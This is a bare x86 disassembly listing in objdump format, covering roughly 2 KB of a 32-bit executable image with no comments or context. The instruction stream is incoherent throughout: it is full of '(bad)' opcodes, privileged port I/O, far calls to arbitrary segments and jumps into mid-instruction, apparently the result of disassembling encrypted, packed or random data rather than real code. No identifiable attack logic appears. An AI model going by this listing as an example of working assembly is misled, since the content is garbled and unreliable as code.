  4028fe:	jae    0x402939
  402900:	push   0x3326c7e0
  402905:	push   ebx
  402906:	add    eax,0x6f0ac5f6
  40290b:	pop    edi
  40290c:	scas   al,BYTE PTR es:[edi]
  40290d:	inc    edx
  40290e:	push   ebx
  40290f:	add    DWORD PTR [edx],esp
  402911:	call   0x6ae9:0x3a88fd6c
  402918:	loope  0x4028ca
  40291a:	jns    0x4028e0
  40291c:	pusha  
  40291d:	nop
  40291e:	popf   
  40291f:	int3   
  402920:	pop    ds
  402921:	cmp    esi,DWORD PTR [edx+ecx*4-0x68359a47]
  402928:	mov    eax,DWORD PTR [esi]
  40292a:	mov    edx,0x31792b19
  40292f:	mul    BYTE PTR [esi-0x35]
  402932:	add    bl,dh
  402934:	int3   
  402935:	cmp    eax,0xdd00ad1
  40293a:	xchg   edx,eax
  40293b:	test   eax,0x89426ae9
  402940:	sub    BYTE PTR [eax+0x23e8a25f],dl
  402946:	xchg   esp,eax
  402947:	ds dec ebx
  402949:	ror    bl,cl
  40294b:	jge    0x40293c
  40294d:	repnz add DWORD PTR [edi-0x3a],edi
  402951:	aaa    
  402952:	lods   eax,DWORD PTR ds:[esi]
  402953:	xor    al,0x10
  402955:	and    BYTE PTR [ebp+0x6081beb5],cl
  40295b:	bound  edx,QWORD PTR [edi-0x122988e4]
  402961:	pop    ss
  402962:	sbb    DWORD PTR [ecx-0x28089bbb],esp
  402968:	into   
  402969:	std    
  40296a:	sahf   
  40296b:	icebp  
  40296c:	cmp    ecx,DWORD PTR [ecx+0x4f]
  40296f:	sub    BYTE PTR [eax-0x15],bh
  402972:	adc    DWORD PTR gs:[edx-0x7b],eax
  402976:	or     esi,DWORD PTR [ecx]
  402978:	fcom   DWORD PTR [ecx+0x666d4276]
  40297e:	into   
  40297f:	outs   dx,BYTE PTR ds:[esi]
  402980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402981:	in     al,dx
  402982:	shl    BYTE PTR [eax+eax*1+0x38],cl
  402986:	lods   al,BYTE PTR ds:[esi]
  402987:	and    eax,0x9ac2d6a7
  40298c:	std    
  40298d:	pop    esp
  40298e:	(bad)  
  40298f:	cmp    al,0x4f
  402991:	push   es
  402992:	mov    eax,0x300f46bf
  402997:	sbb    bl,cl
  402999:	fisub  DWORD PTR [ecx]
  40299b:	jnp    0x402933
  40299d:	xor    ebx,DWORD PTR [ebx]
  40299f:	nop
  4029a0:	ins    DWORD PTR es:[edi],dx
  4029a1:	fist   DWORD PTR [eax]
  4029a3:	cmp    BYTE PTR [edx],0x67
  4029a6:	mov    ch,BYTE PTR [ebx]
  4029a8:	sub    DWORD PTR [edi+0x6f],esp
  4029ab:	push   ds
  4029ac:	cmp    cl,bl
  4029ae:	sub    al,0x93
  4029b0:	inc    esp
  4029b1:	sbb    DWORD PTR [esi+0x59],esi
  4029b4:	pop    ecx
  4029b5:	dec    esi
  4029b6:	js     0x402972
  4029b8:	out    0x9a,eax
  4029ba:	sbb    al,0xb5
  4029bc:	retf   0x856c
  4029bf:	and    ebp,0x69312fc4
  4029c5:	inc    ebx
  4029c6:	and    eax,0x7a549d86
  4029cb:	outs   dx,BYTE PTR ds:[esi]
  4029cc:	xor    al,0x18
  4029ce:	mov    bh,0xa8
  4029d0:	add    al,0x6a
  4029d2:	dec    esi
  4029d3:	or     BYTE PTR [ecx-0x7598d3eb],cl
  4029d9:	ror    BYTE PTR [edx+0x4e5999bb],0x2d
  4029e0:	pop    edi
  4029e1:	sahf   
  4029e2:	jl     0x40299e
  4029e4:	xchg   DWORD PTR [eax+0xf],edi
  4029e7:	mov    DWORD PTR [ebx-0xff4a992],ebx
  4029ed:	dec    ebx
  4029ef:	cli    
  4029f0:	gs (bad) 
  4029f2:	mov    ds:0xeb82809,al
  4029f7:	rcr    ebx,cl
  4029f9:	inc    ecx
  4029fa:	sbb    DWORD PTR [esi],esi
  4029fc:	inc    ecx
  4029fd:	out    dx,eax
  4029fe:	mov    dh,0x13
  402a00:	sbb    DWORD PTR [eax],ebp
  402a02:	repnz sbb bl,ah
  402a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a06:	pushf  
  402a07:	imul   DWORD PTR [edx+0x46]
  402a0a:	fdivp  st(1),st
  402a0c:	xchg   edx,eax
  402a0d:	imul   eax,DWORD PTR [ebp+0x1bbd73bf],0xffffffa2
  402a14:	add    DWORD PTR [edi-0x57],eax
  402a17:	in     eax,dx
  402a18:	or     al,0xd4
  402a1a:	fwait
  402a1b:	enter  0xfb9d,0x1b
  402a1f:	xor    eax,0x57bd1453
  402a24:	pop    DWORD PTR [eax]
  402a26:	xchg   esi,eax
  402a27:	sbb    esp,DWORD PTR [edx-0x80]
  402a2a:	inc    edx
  402a2b:	into   
  402a2c:	mov    esp,0xe73995aa
  402a31:	out    dx,eax
  402a32:	pop    ebx
  402a33:	pushf  
  402a34:	or     esp,eax
  402a36:	outs   dx,BYTE PTR ds:[esi]
  402a37:	xchg   ecx,eax
  402a38:	inc    edi
  402a39:	retf   0x5f13
  402a3c:	mov    al,ds:0xdbf50c04
  402a41:	test   BYTE PTR [edx-0xe4c1851],ch
  402a47:	(bad)  
  402a48:	mov    eax,0x7b3cb2a1
  402a4d:	or     eax,0x73e5f2c4
  402a52:	cld    
  402a53:	ins    BYTE PTR es:[edi],dx
  402a54:	jmp    0x7313b3c3
  402a59:	mov    cl,0x7
  402a5b:	iret   
  402a5c:	add    DWORD PTR [esi+0x38],ebx
  402a5f:	sbb    ebp,DWORD PTR [esi+0x7616f0ca]
  402a65:	pop    eax
  402a66:	inc    edx
  402a67:	xchg   esp,eax
  402a68:	stos   DWORD PTR es:[edi],eax
  402a69:	iret   
  402a6a:	call   0xb2ac5126
  402a6f:	fstp   QWORD PTR [edi+0x5487a580]
  402a75:	das    
  402a76:	xor    cl,BYTE PTR [ebx]
  402a78:	aas    
  402a79:	(bad)  
  402a7a:	cld    
  402a7b:	into   
  402a7c:	push   eax
  402a7d:	repnz imul esp,esp,0xffffffd5
  402a81:	in     al,0x58
  402a83:	sbb    al,0x40
  402a85:	add    ebp,ebx
  402a87:	dec    ecx
  402a88:	xchg   edx,eax
  402a89:	stc    
  402a8a:	mov    al,ds:0xf62f4b39
  402a8f:	sub    al,0xc5
  402a91:	cmp    esi,edi
  402a93:	push   ds
  402a94:	scas   eax,DWORD PTR es:[edi]
  402a95:	les    ebx,FWORD PTR [ebx]
  402a97:	cmc    
  402a98:	rcr    BYTE PTR [edi-0x2],0xbb
  402a9c:	ins    DWORD PTR es:[edi],dx
  402a9d:	xor    al,0x9d
  402a9f:	inc    edx
  402aa0:	mov    ebp,0xf542ecc9
  402aa5:	test   al,0x2b
  402aa7:	xchg   BYTE PTR [ebx+0x4b],bh
  402aaa:	daa    
  402aab:	xchg   ebx,eax
  402aac:	dec    esp
  402aad:	lods   al,BYTE PTR ds:[esi]
  402aae:	mov    bh,0x82
  402ab0:	cld    
  402ab1:	addr16 xchg ebp,eax
  402ab3:	adc    DWORD PTR [edi+edi*8],0xae63bfbe
  402aba:	fcmovnbe st,st(0)
  402abc:	push   ebx
  402abd:	cmp    dh,al
  402abf:	xor    eax,0xffffff89
  402ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ac3:	(bad)  
  402ac4:	pop    esp
  402ac5:	sbb    al,0x9
  402ac7:	adc    BYTE PTR [ecx+0x6f4bcbe],0x5e
  402ace:	fistp  QWORD PTR [edi+0x52919d53]
  402ad4:	inc    ebx
  402ad5:	xor    ebp,DWORD PTR [ebp-0x5c1ce24c]
  402adb:	pop    ebp
  402adc:	stos   DWORD PTR es:[edi],eax
  402add:	enter  0x3c65,0xe5
  402ae1:	test   eax,0x3dab7afd
  402ae6:	in     eax,dx
  402ae7:	test   al,0xf3
  402ae9:	arpl   cx,sp
  402aeb:	xchg   BYTE PTR [ebx+0x40b6995],bh
  402af1:	test   BYTE PTR [esi+0x4],ah
  402af4:	dec    eax
  402af5:	mov    edi,0x386173ff
  402afa:	stos   BYTE PTR es:[edi],al
  402afb:	pop    esi
  402afc:	daa    
  402afd:	adc    ebx,esp
  402aff:	fistp  DWORD PTR [edx]
  402b01:	mov    esi,0xd472cde9
  402b06:	(bad)  
  402b07:	mov    al,ds:0x9ba2e34c
  402b0c:	dec    ecx
  402b0d:	add    eax,ebx
  402b0f:	fadd   st(1),st
  402b11:	popa   
  402b12:	push   0x3b803ccc
  402b17:	pop    cx
  402b19:	pop    edx
  402b1a:	add    eax,0x69f8bdfc
  402b1f:	mov    esp,0xeaf193ad
  402b24:	call   0x4596d819
  402b29:	aas    
  402b2a:	xor    edi,ebx
  402b2c:	mov    ecx,0x44458d62
  402b31:	xchg   edi,eax
  402b32:	jmp    0x9f41:0x8ab856c0
  402b39:	xchg   ecx,eax
  402b3a:	push   ss
  402b3b:	fdivr  DWORD PTR [eax+0x5a]
  402b3e:	xor    DWORD PTR [eax-0x4f],ebx
  402b41:	push   esi
  402b42:	adc    eax,edx
  402b44:	aad    0x86
  402b46:	sub    al,0x99
  402b48:	in     eax,dx
  402b49:	in     eax,0xbe
  402b4b:	add    eax,0xc0816f10
  402b50:	sub    edx,DWORD PTR [edx-0x2d]
  402b53:	push   ds
  402b54:	cmp    BYTE PTR [esp+ecx*1-0x370ee971],ah
  402b5b:	fcmovne st,st(5)
  402b5d:	or     cl,bl
  402b5f:	jbe    0x402b89
  402b61:	and    DWORD PTR [edx+0x10007bec],0x7c878c3d
  402b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b6c:	pop    ss
  402b6d:	out    dx,eax
  402b6e:	dec    ebx
  402b6f:	or     DWORD PTR [esi],esp
  402b71:	mov    ebp,0xefee6ccc
  402b76:	or     eax,0xa3c1e883
  402b7b:	out    dx,al
  402b7c:	mov    DWORD PTR cs:[edx+0x31],eax
  402b80:	cmc    
  402b81:	jg     0x402bc9
  402b83:	pusha  
  402b84:	cld    
  402b85:	sub    DWORD PTR [edx+ebp*2],eax
  402b88:	dec    esi
  402b89:	repz push esi
  402b8b:	sbb    eax,0x5daf2140
  402b90:	mov    edx,0x59f9e022
  402b95:	sub    al,0xe3
  402b97:	inc    esi
  402b98:	adc    eax,0x11e9dee7
  402b9d:	(bad)  
  402b9e:	or     bl,ah
  402ba0:	xchg   esp,eax
  402ba1:	adc    cl,BYTE PTR [ebp-0xecb6dfe]
  402ba7:	in     eax,0x4f
  402ba9:	aas    
  402baa:	jp     0x402bf3
  402bac:	gs clc 
  402bae:	inc    edx
  402baf:	push   ebx
  402bb0:	jle    0x402c24
  402bb2:	cdq    
  402bb3:	enter  0x8cd,0xcc
  402bb7:	ss adc eax,0xb87808b7
  402bbd:	sbb    eax,0x947b5f27
  402bc2:	mov    esp,0xee70bde3
  402bc7:	pop    ebp
  402bc8:	lods   eax,DWORD PTR ds:[esi]
  402bc9:	lods   al,BYTE PTR ds:[esi]
  402bca:	pop    ecx
  402bcb:	pop    es
  402bcc:	dec    eax
  402bcd:	add    al,0x1e
  402bcf:	retf   0xa2a2
  402bd2:	dec    esi
  402bd3:	outs   dx,BYTE PTR ds:[esi]
  402bd4:	cdq    
  402bd5:	ds xchg ebp,eax
  402bd7:	pusha  
  402bd8:	imul   ebx,DWORD PTR [edi+ebp*8+0x30],0xffffffdb
  402bdd:	out    dx,eax
  402bde:	aas    
  402bdf:	xchg   esi,eax
  402be0:	add    ebx,esi
  402be2:	ss jo  0x402c3b
  402be5:	mov    edx,0x99300282
  402bea:	(bad)  
  402bec:	xor    BYTE PTR [edi-0x305ebff6],ch
  402bf2:	jge    0x402bf1
  402bf4:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  402bf6:	dec    ebx
  402bf7:	pop    ebp
  402bf8:	and    DWORD PTR [ecx],0x37
  402bfb:	xor    al,0xda
  402bfd:	pusha  
  402bfe:	mov    eax,0x1866ad11
  402c03:	add    cl,BYTE PTR [esi+edx*4+0x9649d12]
  402c0a:	popa   
  402c0b:	sar    BYTE PTR [edx],cl
  402c0d:	(bad)  
  402c0f:	and    al,0xf7
  402c11:	xor    al,0xd3
  402c13:	add    edx,0x1b
  402c16:	xchg   ecx,eax
  402c17:	add    al,0xa2
  402c19:	das    
  402c1a:	inc    esi
  402c1b:	in     al,0x86
  402c1d:	mov    ch,0xec
  402c1f:	test   edi,esi
  402c21:	call   0x9e7f8475
  402c26:	and    BYTE PTR [edx+0x6a],bh
  402c29:	xchg   ebx,eax
  402c2a:	jnp    0x402c7e
  402c2c:	outs   dx,DWORD PTR ds:[esi]
  402c2d:	out    0xc0,eax
  402c2f:	jns    0x402bd0
  402c31:	pop    ecx
  402c32:	stc    
  402c33:	(bad)  
  402c34:	xor    esi,DWORD PTR [ebp+0x593f23f3]
  402c3a:	inc    ebp
  402c3b:	ficom  DWORD PTR [ebx-0x7d71eb11]
  402c41:	dec    ebx
  402c42:	mov    es,ecx
  402c44:	fstp   DWORD PTR [ebx]
  402c46:	push   ebp
  402c47:	dec    ebp
  402c48:	in     eax,dx
  402c49:	push   ds
  402c4a:	and    ah,BYTE PTR [ebx-0x42665a27]
  402c50:	(bad)
  402c54:	dec    esp
  402c55:	pop    esp
  402c56:	test   DWORD PTR [ebx+ebp*4-0x63],edx
  402c5a:	mov    dh,0x11
  402c5c:	and    ebx,eax
  402c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c5f:	dec    ecx
  402c60:	mov    esp,0xcb3c164c
  402c65:	icebp  
  402c66:	pop    edi
  402c67:	mov    esp,0xaf792d22
  402c6c:	stc    
  402c6d:	lea    eax,[edx+0x29]
  402c70:	stos   BYTE PTR es:[edi],al
  402c71:	add    BYTE PTR [edx-0x44],cl
  402c74:	mov    eax,ds:0x3465ebd
  402c79:	jo     0x402c20
  402c7b:	push   ss
  402c7c:	imul   ebp,ebx,0xffffffab
  402c7f:	inc    edi
  402c80:	cmc    
  402c81:	stc    
  402c82:	add    BYTE PTR cs:[esi+eiz*8+0x41],al
  402c87:	cld    
  402c88:	pop    eax
  402c89:	aam    0x19
  402c8b:	adc    BYTE PTR [eax],dh
  402c8d:	icebp  
  402c8e:	rcl    DWORD PTR [edx],cl
  402c90:	int3   
  402c91:	cdq    
  402c92:	adc    al,0x95
  402c94:	iret   
  402c95:	js     0x402cca
  402c97:	add    bl,al
  402c99:	lahf   
  402c9a:	mov    ebp,0xa64b5b0d
  402c9f:	nop
  402ca0:	aad    0xc5
  402ca2:	mov    WORD PTR [ebp-0x39],?
  402ca5:	cdq    
  402ca6:	sub    ah,BYTE PTR [ebx-0x60]
  402ca9:	fsubp  st(6),st
  402cab:	fild   DWORD PTR [ecx-0x76]
  402cae:	inc    ecx
  402caf:	or     al,0xac
  402cb1:	int    0x85
  402cb3:	mov    bl,0x9b
  402cb5:	popf   
  402cb6:	pop    esp
  402cb7:	rol    BYTE PTR [edx+eax*1],0x49
  402cbb:	mov    eax,gs:0x2447b2fe
  402cc1:	loope  0x402cc0
  402cc3:	not    DWORD PTR [eax-0x19da0adf]
  402cc9:	call   0xca4e:0x514cdd11
  402cd0:	not    DWORD PTR [esp+eiz*2-0xd]
  402cd4:	jae    0x402d0d
  402cd6:	xchg   edx,eax
  402cd7:	adc    DWORD PTR [ecx],eax
  402cd9:	or     DWORD PTR [ebx+0x2420935],esi
  402cdf:	add    bl,0xb5
  402ce2:	mov    al,0x4b
  402ce4:	(bad)  
  402ce5:	push   eax
  402ce6:	(bad)  
  402ce7:	fld    DWORD PTR [ecx+0x4aaa06a0]
  402ced:	and    al,0x13
  402cef:	fisubr DWORD PTR [ecx+0x28]
  402cf2:	loopne 0x402cc1
  402cf4:	xchg   esi,eax
  402cf5:	xchg   ebx,eax
  402cf6:	xchg   esp,eax
  402cf7:	push   esi
  402cf8:	hlt    
  402cf9:	ja     0x402ced
  402cfb:	lds    eax,FWORD PTR [ebx+0x1e7cfc4b]
  402d01:	in     eax,dx
  402d02:	mov    eax,0x46348983
  402d07:	and    BYTE PTR [edi],dh
  402d09:	dec    BYTE PTR [edx+0x70]
  402d0c:	sti    
  402d0d:	sbb    eax,0xb138d73a
  402d12:	fs ja  0x402cef
  402d15:	test   al,0x96
  402d17:	ja     0x402d7f
  402d19:	popf   
  402d1a:	ret    
  402d1b:	jg     0x402d24
  402d1d:	inc    ebx
  402d1e:	adc    DWORD PTR [esi],ebx
  402d20:	imul   ecx,DWORD PTR [esi-0xc025d28],0x3f
  402d27:	and    al,0xa1
  402d29:	dec    edi
  402d2a:	imul   edx,DWORD PTR [ecx+ebp*1+0x66],0x2c
  402d2f:	(bad)  
  402d30:	sbb    bx,WORD PTR [eax-0x3]
  402d34:	fcomp  st(5)
  402d36:	fs dec esi
  402d38:	mov    DWORD PTR [ebp+0x6f],esp
  402d3b:	inc    esp
  402d3c:	or     al,0x9b
  402d3e:	dec    eax
  402d3f:	sar    DWORD PTR [edx],0x96
  402d42:	xchg   ebx,eax
  402d43:	mov    ecx,0x5aa820e2
  402d48:	xor    BYTE PTR [eax+0x5c],cl
  402d4b:	test   al,0xd5
  402d4d:	xchg   esi,eax
  402d4e:	jb     0x402d18
  402d50:	jmp    0x402ce5
  402d52:	push   ebx
  402d53:	cmp    bl,BYTE PTR [ecx+0x1708c24b]
  402d59:	inc    esi
  402d5a:	push   DWORD PTR [edi+0x7f]
  402d5d:	scas   al,BYTE PTR es:[edi]
  402d5e:	cmp    cl,dh
  402d60:	pop    ecx
  402d61:	loope  0x402d78
  402d63:	lds    esp,FWORD PTR [edx]
  402d65:	push   esp
  402d66:	sub    al,0xd3
  402d68:	sub    DWORD PTR [eax+ebp*2-0x1],0x35
  402d6d:	fsubr  QWORD PTR [edi-0x27]
  402d70:	data16 mov dl,0xd
  402d73:	add    bh,ch
  402d75:	push   ds
  402d76:	aaa    
  402d77:	or     esp,DWORD PTR [eax]
  402d79:	sti    
  402d7a:	in     al,dx
  402d7b:	popa   
  402d7c:	test   al,0x2a
  402d7e:	mov    ebp,0xd3d8efcb
  402d83:	adc    eax,0x88664689
  402d88:	popa   
  402d89:	sub    edi,DWORD PTR [edx+0x2aa4c0f3]
  402d8f:	mov    al,ds:0xb4d3435e
  402d94:	jnp    0x402d8d
  402d96:	test   al,0xb6
  402d98:	mov    ch,0x54
  402d9a:	and    ebp,0x33
  402d9d:	(bad)  
  402d9e:	call   0xbadffef3
  402da3:	scas   al,BYTE PTR es:[edi]
  402da4:	pusha  
  402da5:	mov    ?,WORD PTR [ebx]
  402da7:	into   
  402da8:	pop    ecx
  402da9:	mov    esp,0x4b6ba870
  402dae:	dec    ebp
  402daf:	lahf   
  402db0:	adc    BYTE PTR [ebp-0x4da01942],0x92
  402db7:	shr    ebp,cl
  402db9:	fprem1 
  402dbb:	lds    edx,FWORD PTR [edi-0x416861d7]
  402dc1:	bnd jne 0x402d52
  402dc4:	shl    DWORD PTR [ebp+0x55],1
  402dc7:	sar    DWORD PTR [ebx-0x3f640846],0x6b
  402dce:	pop    edx
  402dcf:	loope  0x402e3f
  402dd1:	push   0x86847507
  402dd6:	(bad)  
  402dd7:	jae    0x402e32
  402dd9:	addr16 dec ecx
  402ddb:	loopne 0x402d76
  402ddd:	test   BYTE PTR [ebp-0x66addad0],bh
  402de3:	cmp    BYTE PTR [edx+0x25af6171],al
  402de9:	(bad)  
  402dea:	mul    BYTE PTR [ebx-0x2b5b2566]
  402df0:	dec    edx
  402df1:	or     eax,0x1aa8c818
  402df6:	fcmovbe st,st(0)
  402df8:	push   ds
  402df9:	aaa    
  402dfa:	jmp    FWORD PTR [edi-0x78eb114]
  402e00:	cmc    
  402e01:	mov    ebx,0x378a5ff0
  402e06:	cwde   
  402e07:	jl     0x402e50
  402e09:	add    BYTE PTR [ecx+0x79aa46b2],dl
  402e0f:	dec    ebp
  402e10:	jg     0x402e33
  402e12:	xor    BYTE PTR [ebp+0x7],ch
  402e15:	ret    0xdab9
  402e18:	mov    dh,0xa8
  402e1a:	push   eax
  402e1b:	pop    ds
  402e1c:	div    BYTE PTR [ebx+0x31b66d5e]
  402e22:	xchg   ebp,eax
  402e23:	sub    eax,0x35502d7f
  402e28:	ror    DWORD PTR [ebp+0x2f],1
  402e2b:	mul    esi
  402e2d:	xchg   ebp,eax
  402e2e:	mov    al,0xa2
  402e30:	jmp    0x55ec:0x6160d837
  402e37:	sbb    eax,0xb212af13
  402e3c:	lock sbb ebx,edx
  402e3f:	cmp    DWORD PTR [esi+eax*1-0x3e],0x64a25673
  402e47:	retf   0x4b41
  402e4a:	sbb    dh,BYTE PTR [edi-0x26]
  402e4d:	je     0x402df4
  402e4f:	and    eax,0xfc49ca1e
  402e54:	push   esi
  402e55:	outs   dx,BYTE PTR ds:[esi]
  402e56:	out    0xd2,al
  402e58:	push   edx
  402e59:	push   es
  402e5a:	adc    ebp,ebx
  402e5c:	fimul  WORD PTR [edx+eiz*1]
  402e5f:	xor    esi,esi
  402e61:	jmp    0xe995:0x6d66758a
  402e68:	jge    0x402ebb
  402e6a:	fmul   QWORD PTR [esi-0x3ab74500]
  402e70:	push   esi
  402e71:	retf   0x4df8
  402e74:	mov    ds:0xebfb39a6,eax
  402e79:	adc    eax,0x8497dbe8
  402e7e:	jns    0x402e8f
  402e80:	pop    ds
  402e81:	cwde   
  402e82:	sub    al,0x4e
  402e84:	jmp    0x402e9b
  402e86:	pop    es
  402e87:	jle    0x402eac
  402e89:	stc    
  402e8a:	inc    ebp
  402e8b:	sub    eax,0x1f9139bf
  402e90:	cmp    ebx,eax
  402e92:	adc    eax,0xe4633a5e
  402e97:	pop    ebp
  402e98:	pop    esp
  402e99:	cdq    
  402e9a:	add    DWORD PTR [edx+0x32fed31d],edi
  402ea0:	iret   
  402ea1:	or     ebp,esp
  402ea3:	scas   al,BYTE PTR es:[edi]
  402ea4:	pop    ebp
  402ea5:	outs   dx,DWORD PTR ds:[esi]
  402ea6:	and    eax,0x2d9aa4c0
  402eab:	test   eax,0xa87634e1
  402eb0:	mov    fs,WORD PTR [edi+edi*1]
  402eb3:	pushf  
  402eb4:	call   0x4bb6:0xd6d30d98
  402ebb:	outs   dx,BYTE PTR ds:[esi]
  402ebc:	mov    dl,0x57
  402ebe:	dec    ebx
  402ebf:	adc    al,0x8e
  402ec1:	and    DWORD PTR [edx+0x47103afd],ebx
  402ec7:	mov    eax,0xfa3617a7
  402ecc:	fwait
  402ecd:	push   eax
  402ece:	shld   DWORD PTR [ecx+0x41c05d0c],eax,0xcf
  402ed6:	fld    QWORD PTR [edx+eax*4]
  402ed9:	call   0x69aa4e53
  402ede:	pop    eax
  402edf:	cwde   
  402ee0:	inc    edx
  402ee1:	lea    ebp,[ebp+0x51]
  402ee4:	push   esp
  402ee5:	or     dl,BYTE PTR [edi-0x6f]
  402ee8:	push   ecx
  402ee9:	jnp    0x402e71
  402eeb:	mov    ch,0x80
  402eed:	lods   eax,DWORD PTR ds:[esi]
  402eee:	enter  0xa3e3,0x32
  402ef2:	outs   dx,BYTE PTR ds:[esi]
  402ef3:	jecxz  0x402edc
  402ef5:	icebp  
  402ef6:	sub    ecx,0x10d646c0
  402efc:	xlat   BYTE PTR ds:[ebx]
  402efd:	inc    ebx
  402efe:	mov    ah,0x77
  402f00:	jnp    0x402f29
  402f02:	repnz inc eax
  402f04:	xor    edx,DWORD PTR [ebx+edx*1]
  402f07:	test   BYTE PTR [edi+0x49af82fc],bl
  402f0d:	lahf   
  402f0e:	xor    al,0x59
  402f10:	shl    BYTE PTR [edx-0x293d00f8],1
  402f16:	je     0x402ec2
  402f18:	or     al,0x97
  402f1a:	test   eax,0x4676a1f0
  402f1f:	sub    eax,0xfe551af1
  402f24:	test   eax,0x41b350d3
  402f29:	fist   DWORD PTR [ebx+0x4def7bd]
  402f2f:	push   ebp
  402f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f31:	pop    esi
  402f32:	test   al,0x97
  402f34:	psubb  mm6,QWORD PTR [edx]
  402f37:	adc    DWORD PTR [ebx],edi
  402f39:	and    BYTE PTR [ebx+edx*8+0x172ca9d0],bl
  402f40:	call   0x1dcfc592
  402f45:	inc    ebp
  402f46:	xchg   ebp,eax
  402f47:	sub    ebx,DWORD PTR [eax+eax*8+0x1b6a75bb]
  402f4e:	in     al,dx
  402f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f50:	sub    eax,0x7167ae90
  402f55:	nop
  402f56:	mov    eax,ecx
  402f58:	ds push eax
  402f5a:	arpl   WORD PTR [eax+edx*1-0xc],si
  402f5e:	mov    ecx,0xc49ca456
  402f63:	mov    bl,bl
  402f65:	ror    ah,cl
  402f67:	daa    
  402f68:	ds xchg edx,eax
  402f6a:	and    DWORD PTR [esi],0x76
  402f6d:	sub    eax,0xcd3706e7
  402f72:	into   
  402f73:	sub    al,0x63
  402f75:	out    0x96,eax
  402f77:	or     eax,0x709a1543
  402f7c:	mov    eax,ds:0xd2fe5d89
  402f81:	cmc    
  402f82:	xlat   BYTE PTR ds:[ebx]
  402f83:	sbb    eax,0x900ae2de
  402f88:	retf   0x632e
  402f8b:	pusha  
  402f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f8d:	mov    dl,0xc2
  402f8f:	aad    0xe
  402f91:	jne    0x402f3f
  402f93:	mov    ah,0x83
  402f95:	push   edx
  402f96:	arpl   WORD PTR [esi+0x49],bp
  402f99:	push   edi
  402f9a:	aam    0xb4
  402f9c:	in     eax,0xa0
  402f9e:	sbb    dh,BYTE PTR [edi+0x797504c2]
  402fa4:	cdq    
  402fa5:	mov    cl,0x48
  402fa7:	push   cs
  402fa8:	call   0xe53f1e3d
  402fad:	pop    ds
  402fae:	(bad)  
  402faf:	xor    bl,dh
  402fb1:	push   esi
  402fb2:	loope  0x403013
  402fb4:	mov    ebx,0x22e3bf0c
  402fb9:	call   0x4672:0x2454a04d
  402fc0:	mov    eax,edi
  402fc2:	(bad)  
  402fc3:	push   esp
  402fc4:	out    dx,eax
  402fc5:	jnp    0x402f47
  402fc7:	aaa    
  402fc8:	jp     0x402fbf
  402fca:	std    
  402fcb:	and    al,BYTE PTR [ecx]
  402fcd:	lods   eax,DWORD PTR ds:[esi]
  402fce:	xchg   dx,ax
  402fd0:	xchg   esi,eax
  402fd1:	(bad)  
  402fd2:	outs   dx,BYTE PTR ds:[esi]
  402fd3:	ins    DWORD PTR es:[edi],dx
  402fd4:	popa   
  402fd5:	pop    eax
  402fd6:	mov    eax,0xbaa78c87
  402fdb:	ss sub eax,0xefaf6c72
  402fe1:	dec    edx
  402fe2:	and    BYTE PTR [edx],0xf7
  402fe5:	stos   DWORD PTR es:[edi],eax
  402fe6:	out    dx,eax
  402fe7:	xchg   BYTE PTR [ecx],cl
  402fe9:	jle    0x402fac
  402feb:	sbb    ecx,DWORD PTR [edi-0x1167f25a]
  402ff1:	ja     0x403041
  402ff3:	sub    ebx,DWORD PTR [edx+0x55fce19]
  402ff9:	jns    0x403027
  402ffb:	rcr    BYTE PTR [ebx+0x548f06cd],1
  403001:	jns    0x403074
  403003:	popa   
  403004:	imul   eax,DWORD PTR [esi],0xa9bfe195
  40300a:	jo     0x402fa6
  40300c:	sub    al,al
  40300e:	mov    eax,0x52993ab4
  403013:	daa    
  403014:	(bad)  
  403015:	popf   
  403016:	imul   edi,DWORD PTR [esp+eax*1+0xe],0xca9cfee3
  40301e:	mov    WORD PTR [eax+0x3e],?
  403021:	leave  
  403022:	lods   al,BYTE PTR ds:[esi]
  403023:	and    DWORD PTR [eax+0x1f],ecx
  403026:	out    dx,al
  403027:	dec    ecx
  403028:	rcr    BYTE PTR [ecx+0x4a],1
  40302b:	imul   ebp,DWORD PTR [ebp+0x71c7c17],0xffffffa2
  403032:	(bad)  
  403033:	repz call 0x8365ac02
  403039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40303a:	(bad)  
  40303b:	in     al,0x61
  40303d:	fwait
  40303e:	(bad)  
  40303f:	fcmovu st,st(0)
  403041:	iret   
  403042:	mov    bl,bl
  403044:	or     eax,0x19a60575
  403049:	pop    edx
  40304a:	leave  
  40304b:	retf   0x29c5
  40304e:	pop    ebx
  40304f:	cmove  eax,DWORD PTR [edx*4+0x4b626642]
  403057:	and    esp,DWORD PTR ds:0xa56bb460
  40305d:	loop   0x40300f
  40305f:	pusha  
  403060:	test   ah,ch
  403062:	retf   0xc77d
  403065:	or     bl,BYTE PTR [ebx-0xf3a7d2]
  40306b:	adc    al,0x36
  40306d:	mov    ebp,0x6e0b85cb
  403072:	cmp    edi,DWORD PTR [edx-0x5aff1d5b]
  403078:	mov    DWORD PTR [ebp+0x79747a7d],eax
  40307e:	pushf  
  40307f:	and    BYTE PTR [ecx+0x1741c7bb],cl
  403085:	pop    esi
  403086:	dec    ebp
  403087:	push   ds
  403088:	popf   
  403089:	pop    edi
  40308a:	or     eax,0x10902897
  40308f:	imul   ebx,ebx,0x53b2374b
  403095:	jae    0x4030f5
  403097:	cmp    dl,ch
  403099:	xchg   ebx,eax
  40309a:	mov    ch,0x39
  40309c:	not    DWORD PTR [ebx+0x52]
  40309f:	popf   
  4030a0:	xor    cl,ah
  4030a2:	ficomp WORD PTR ss:[edi-0x1f]
  4030a6:	hlt    
  4030a7:	ins    BYTE PTR es:[edi],dx
  4030a8:	jae    0x40309d
  4030aa:	pop    edi
  4030ab:	or     ebp,ecx
  4030ad:	dec    ecx
  4030ae:	cs aas 
  4030b0:	push   eax
  4030b1:	jecxz  0x4030e8
  4030b3:	pop    esi
  4030b4:	pushf  
  4030b5:	(bad)  
  4030b6:	cmp    BYTE PTR [ebx],bl
  4030b8:	mov    fs,ebp
  4030ba:	or     DWORD PTR [ebp-0x42],ebp
  4030bd:	jns    0x40304a
  4030bf:	pop    ds
